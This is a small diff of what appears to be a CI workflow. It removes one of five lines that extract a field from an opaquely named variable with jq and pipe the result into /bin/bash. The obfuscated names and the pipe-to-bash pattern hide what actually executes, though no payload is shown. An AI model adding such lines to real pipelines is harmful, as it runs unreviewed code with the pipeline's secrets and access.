@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$ef8" | jq -r .i1 | /bin/bash
           printf '%s' "$n515" | jq -r .h347 | /bin/bash
           echo $sxhs06465 | jq -r .zu180 | /bin/bash
-          echo $p57131 | jq -r .ryhvy0519 | /bin/bash
           echo $tzx2262 | jq -r .y81 | /bin/bash
 
       - name: Upload results
